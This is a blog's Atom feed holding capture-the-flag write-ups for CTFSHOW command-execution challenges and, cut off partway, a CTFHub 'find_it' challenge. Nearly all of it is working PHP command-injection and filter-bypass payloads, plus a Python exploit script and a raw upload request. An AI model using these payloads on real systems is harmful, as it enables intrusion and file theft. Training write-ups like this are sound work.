<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>孤独星球</title>
  
  <subtitle>H3h3QAQの博客</subtitle>
  <link href="https://h3h3qaq.github.io/atom.xml" rel="self"/>
  
  <link href="https://h3h3qaq.github.io/"/>
  <updated>2021-11-11T02:38:31.443Z</updated>
  <id>https://h3h3qaq.github.io/</id>
  
  <author>
    <name>H3h3QAQ</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTFSHOW命令执行</title>
    <link href="https://h3h3qaq.github.io/posts/62244cdb.html"/>
    <id>https://h3h3qaq.github.io/posts/62244cdb.html</id>
    <published>2021-11-11T03:35:22.000Z</published>
    <updated>2021-11-11T02:38:31.443Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CTFSHOW命令执行"><a href="#CTFSHOW命令执行" class="headerlink" title="CTFSHOW命令执行"></a>CTFSHOW命令执行</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p>过滤了<code>flag</code></p><p>payload：</p><p>随便写几个姿势</p><pre class="line-numbers language-none"><code class="language-none">/?c=system("nl fl??????");/?c=system("nl fl*");/?c=system("nl fla''g.php");/?c=echo `nl fla""g.php`;/?c=echo `nl fla\g.php`;/?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php/?c=eval($_GET[1]);&amp;1=system('nl flag.php');剩下的我不会了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>##web30</p><p>过滤了<code>flag|system|php</code></p><p>用echo 反引号来执行命令</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=echo `nl fla""g.p""hp`;/?c=echo `nl fla?????`;/?c=echo `nl f*`;/?c=eval($_GET[1]);&amp;1=system('nl flag.php');/?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p>过滤了<code>flag|system|php|cat|sort|shell|\.| |   </code></p><p>没关系，我们有都是姿势</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));/?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>##web32</p><p><code>include不用括号，分号可以用?&gt;代替。</code></p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system("cat flag.php");?&gt;/?c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web33-36"><a href="#web33-36" class="headerlink" title="web33-36"></a>web33-36</h2><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system("cat flag.php");?&gt;/?c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag in flag.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==/?c=data://text/palin,&lt;?php system("nl fla*");?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p>过滤了<code>flag</code></p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=data://text/palin,&lt;?php%20system("nl%20f*");?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p>理论上是异或</p><p>然后我懒</p><p>贴exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> recontent <span class="token operator">=</span> <span class="token string">''</span>preg <span class="token operator">=</span> <span class="token string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>preg<span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span> <span class="token keyword">or</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>preg<span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            k <span class="token operator">=</span> i <span class="token operator">|</span> j            <span class="token keyword">if</span> k<span class="token operator">&gt;=</span><span class="token number">32</span> <span class="token keyword">and</span> k<span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">:</span>                a <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>                b <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>                content <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span><span class="token operator">+</span> a <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> b <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'rce_or.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token shell-comment comment"># -*- coding: utf-8 -*-</span>import requestsimport urllibfrom sys import <span class="token operator">*</span>import osos<span class="token punctuation">.</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php rce_or.php"</span><span class="token punctuation">)</span>  <span class="token shell-comment comment">#没有将php写入环境变量需手动运行</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"="</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'USER：python exp.py &lt;url&gt;'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"eg：  python exp.py http://ctf.show/"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"="</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>url<span class="token operator">=</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>def <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>    s1<span class="token operator">=</span><span class="token double-quoted-string string">""</span>    s2<span class="token operator">=</span><span class="token double-quoted-string string">""</span>    <span class="token keyword">for</span> i in arg<span class="token punctuation">:</span>        f<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"rce_or.txt"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"r"</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean constant">True</span><span class="token punctuation">:</span>            t<span class="token operator">=</span>f<span class="token punctuation">.</span><span class="token function">readline</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token double-quoted-string string">""</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>                <span class="token shell-comment comment">#print(i)</span>                s1<span class="token operator">+</span><span class="token operator">=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>                s2<span class="token operator">+</span><span class="token operator">=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>                <span class="token keyword">break</span>        f<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    output<span class="token operator">=</span><span class="token double-quoted-string string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token double-quoted-string string">"\"|\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token double-quoted-string string">"\")"</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean constant">True</span><span class="token punctuation">:</span>    param<span class="token operator">=</span><span class="token function">action</span><span class="token punctuation">(</span><span class="token function">input</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"\n[+] your function："</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">action</span><span class="token punctuation">(</span><span class="token function">input</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"[+] your command："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token single-quoted-string string">'c'</span><span class="token punctuation">:</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span><span class="token function">unquote</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    r<span class="token operator">=</span>requests<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"\n[*] result:\n"</span><span class="token operator">+</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>exp取自<a href="https://wp.ctf.show/d/137-ctfshow-web-web41/4">https://wp.ctf.show/d/137-ctfshow-web-web41/4</a></p></blockquote><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">/?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><p>/dev/null 2&gt;&amp;1，让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</p><p><code>%0a</code>、<code>%26</code>、<code>||</code>截断</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=nl%20*%0a= =姿势就不写那么多了截断后看过滤自由发挥<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><p>过滤了<code>;|cat</code></p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=nl%20*%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><p>多过滤了个<code>flag</code></p><p>通配符搞定</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=nl%20*%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><p>空格被过滤了</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=nl$IFS*%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web46-49"><a href="#web46-49" class="headerlink" title="web46-49"></a>web46-49</h2><p>过滤了<code>\;|cat|flag| |[0-9]|\\$|\*/</code></p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=nl%09fla\g.php||/?c=nl%09fla\g.php%0a/?c=nl%09fla''g.php%0a/?c=nl%09fla""g.php%0a/?c=vi%09fla\g.php%0a/?c=tac%09fla\g.php%0a/?c=uniq%09fla\g.php%0a/?c=nl&lt;fla''g.php||/?c=nl%09fla\g.php%26<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web50-51"><a href="#web50-51" class="headerlink" title="web50-51"></a>web50-51</h2><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=nl&lt;fla%27%27g.php||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=nl${IFS}/fl""ag%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=nl${IFS}fla%''g.p''hp/?c=ca''t${IFS}fl??????/?c=ca''t${IFS}fl''ag.p''hp应该还有其他姿势<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=mv${IFS}fla?.php${IFS}t.tx''t爷给他改个名/?c=/bin/?at${IFS}f???????<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><p>= = 只能是数字</p><p>对不起骚套路开始</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=/???/????64+????.???<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><blockquote><p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p></blockquote><p>数据包：</p><pre class="line-numbers language-none"><code class="language-none">POST /?c=.+/???/????????[@-[] HTTP/1.1Host: 6595d4e2-edc5-4ff4-a08b-c93d2f563732.challenge.ctf.show:8080Content-Length: 329Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: nullContent-Type: multipart/form-data; boundary=----WebKitFormBoundarydZeuVbMPZVcyvpNMUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundarydZeuVbMPZVcyvpNMContent-Disposition: form-data; name="file"; filename="2.php"Content-Type: application/octet-stream#!/bin/shcat /var/www/html/flag.php------WebKitFormBoundarydZeuVbMPZVcyvpNMContent-Disposition: form-data; name="submit"111------WebKitFormBoundarydZeuVbMPZVcyvpNM--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>##web58</p><p>凑36</p><p>-37取反=36</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">$((~$(($((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))))))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>##web59</p><p>绕过disable_functions</p><p>我只想到一种</p><p><code>file</code>可以把文件读取到一个数组，再打印出来</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">c=var_dump(file('flag.php'));c=highlight_file("flag.php");c=show_source('flag.php');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>##web60-65</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">c=highlight_file("flag.php");c=show_source('flag.php');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">c=var_dump(scandir("/"));扫描到flag 是txt然后日他妈的c=highlight_file('/flag.txt');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web67-70"><a href="#web67-70" class="headerlink" title="web67-70"></a>web67-70</h2><p>= = 好家伙</p><p>ban的真多</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">c=include('/flag.txt');c=require('/flag.txt');c=require_once('/flag.txt');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><p><code>ob_get_contents — 返回输出缓冲区的内容 ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</code></p><p>此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在<strong>ob_end_clean()**之前调用<a href="function.ob-get-contents.html">ob_get_contents()</a>，因为当调用</strong>ob_end_clean()**时缓冲区内容将被丢弃。</p><blockquote><p><a href="https://blog.csdn.net/solitudi/article/details/109837640?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163062881716780269897928%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163062881716780269897928&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109837640.first_rank_v2_pc_rank_v29&amp;utm_term=y4tacker+%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/solitudi/article/details/109837640?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163062881716780269897928%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163062881716780269897928&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109837640.first_rank_v2_pc_rank_v29&amp;utm_term=y4tacker+%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;spm=1018.2226.3001.4187</a> y4的blog说的很清楚</p></blockquote><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">c=include('/flag.txt');;exit();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2><blockquote><p>看一下y4的blog就可以了= = payload不贴了 太长了。</p></blockquote><p>##web73</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c=?&gt;<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看一下目录</p><p>然后</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">c=include('/flagc.txt');exit();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h2><p>同73题</p><h2 id="web75-76"><a href="#web75-76" class="headerlink" title="web75-76"></a>web75-76</h2><p>扫目录</p><pre class="line-numbers language-none"><code class="language-none">c=$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f-&gt;__toString().' ');}exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>mysql load_file读文件</p><pre class="line-numbers language-none"><code class="language-none">c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');foreach($dbh-&gt;query('select load_file("/flag36.txt")') as $row){echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e-&gt;getMessage();exit(0);}exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>##web77</p><p>不是很清楚这个题怎么做</p><p>但是我复现了一下</p><blockquote><p><a href="https://www.laruence.com/2020/03/11/5475.html">https://www.laruence.com/2020/03/11/5475.html</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/108619930">https://blog.csdn.net/miuzzx/article/details/108619930</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="做题记录" scheme="https://h3h3qaq.github.io/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub 2021-第四届红帽杯网络安全大赛-Web-find_it</title>
    <link href="https://h3h3qaq.github.io/posts/ce4e97fc.html"/>
    <id>https://h3h3qaq.github.io/posts/ce4e97fc.html</id>
    <published>2021-11-11T03:35:22.000Z</published>
    <updated>2021-11-11T02:44:33.558Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CTFHub-2021-第四届红帽杯网络安全大赛-Web-find-it"><a href="#CTFHub-2021-第四届红帽杯网络安全大赛-Web-find-it" class="headerlink" title="[CTFHub] 2021-第四届红帽杯网络安全大赛-Web-find_it"></a>[CTFHub] 2021-第四届红帽杯网络安全大赛-Web-find_it</h1><p>看群里说CTFHub上复现了， 我来看看</p><p>本来想按照红帽杯的套路来试一下，发现phpinfo里莫得flag了</p><p><img src="https://i.loli.net/2021/05/12/VefYUiBcQvhkTIo.png"></p><p>只能想想其他办法咯</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token shell-comment comment">#Really easy...</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable 2 open!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hack</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"hack.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable 2 open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/'</span><span class="token punctuation">,</span><span class="token 